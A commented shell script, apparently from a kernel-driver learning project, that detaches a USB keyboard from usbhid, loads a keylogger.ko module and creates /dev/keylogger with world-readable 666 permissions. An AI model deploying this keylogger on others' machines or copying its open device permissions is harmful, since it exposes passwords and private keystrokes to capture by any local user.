#!/bin/sh
# Use /bin/sh as the shell to run this script.

set -e
# Exit immediately if any command in this script fails (non‑zero status).

# TODO: adjust this to your actual keyboard bus ID, e.g. "1-1.2"
KBD_BUS_ID="1-1"
# KBD_BUS_ID: identifies your USB keyboard on the USB bus.
# You normally get this from tools like "lsusb" or from /sys.
# It must match the device you want to attach to your keylogger driver.

echo "[setup] Unbinding keyboard from usbhid..."
echo "${KBD_BUS_ID}:1.0" | sudo tee /sys/bus/usb/drivers/usbhid/unbind
# Take the keyboard away from the normal usbhid driver.
# Writing "<bus-id>:1.0" into "unbind" tells the kernel:
#   "Detach usbhid from this keyboard interface".

echo "[setup] Inserting keylogger module..."
sudo insmod ../driver/keylogger.ko
# Load your keylogger.ko kernel module into the running kernel.
# After this, your USB driver can bind to the keyboard instead of usbhid.

# If /dev/keylogger not created by udev for some reason, create manually.
if [ ! -e /dev/keylogger ]; then
    # Check if the /dev/keylogger device file exists.
    echo "[setup] /dev/keylogger missing, creating manually..."

    MAJOR=$(grep keylogger /proc/devices | awk '{print $1}')
    # Look in /proc/devices for a line containing "keylogger".
    # The first column is the major device number. Save it in MAJOR.

    if [ -z "$MAJOR" ]; then
        # If MAJOR is empty, we didn’t find the driver in /proc/devices.
        echo "Cannot find major number for keylogger"
        exit 1
    fi

    sudo mknod /dev/keylogger c "$MAJOR" 0
    # Create the /dev/keylogger device file by hand:
    #  - "c" = character device,
    #  - major = "$MAJOR",
    #  - minor = 0.

    sudo chmod 666 /dev/keylogger
    # Make /dev/keylogger readable and writable by all users
    # (for testing; in real use you might want stricter permissions).
fi

echo "[setup] Done."
# Print a final message so the user knows setup is finished.

